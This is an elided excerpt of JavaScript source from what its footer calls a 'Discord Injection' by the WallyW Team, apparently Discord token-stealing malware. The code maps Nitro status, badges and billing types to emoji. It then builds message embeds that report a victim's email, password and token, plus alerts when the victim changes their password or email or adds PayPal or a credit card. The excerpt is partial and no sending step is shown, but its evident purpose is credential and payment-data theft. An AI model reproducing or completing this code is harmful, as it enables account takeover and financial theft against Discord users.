    ...
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          ...
          break;
        case 2:
          billing += '<:paypal:1124773988300755094> ';
          break;
      }
    }
  });
...
const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return '<:9343deadmf:1128704665090015232>No Nitro';
    case 1:
      return '<a:nitro2:1124770357971275856>';
    case 2:
      return '<a:nitro1:1124770364841537627>';
    default:
      return '<:9343deadmf:1128704665090015232>No Nitro';
  }
};
...
const getBadges = (flags) => {
  ...
  switch (flags) {
    case 1:
      badges += '<:Staff:1124771930214502461>, ';
      break;
    case 2:
      badges += '<:9895_new_discord_partner_2:1128704640226185286>, ';
      break;
    case 131072:
      badges += '<:Badge_botdeveloper:1124769558474002432>, ';
      break;
    case 4:
      badges += '<:Badge_Hypesquad:1124769566187323555>, ';
      break;
    case 16384:
      badges += '<:Badge_bug_hunter_Gold:1124769564425719898>, ';
      break;
    case 8:
      badges += '<:Badge_bug_hunter:1124769560160129164>, ';
      break;
    case 512:
      badges += '<:Badge_early_supporter:1124769584919089214>, ';
      break;
    case 128:
      badges += '<:Badge_Hypesquad_Brilliance:1124769580557008976>, ';
      break;
    case 64:
      badges += '<:Badge_Hypesquad_Bravery:1124769623930314925>, ';
      break;
    case 256:
      badges += '<:Badge_Hypesquad_Balance:1124769598202454118>, ';
      break;
    case 0:
      badges = '<:9343deadmf:1128704665090015232>None';
      break;
    default:
      badges = '<:9343deadmf:1128704665090015232>None';
      break;
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:variant2:1129443447732973600>**Account Info**',
            value: `Email: **${email}** - Password: **${password}**`,
            inline: false,
          },
          {
            name: '<:variant1:1129443442116808795>**Discord Info**',
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: false,
          },
          {
            name: '<a:wdiamond:1108036101458894898>**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        ...
        footer: {
          text: '??�Discord Injection By WallyW Team | .gg/wmarkett',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<a:TB_warning_animated:1115994604009951272>**Password Changed**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:MAILL:1124774768630046730>**Email Changed**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:paypal:1124773988300755094>**Paypal Added**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:card:1124773877688586361>**Credit Card Added**',
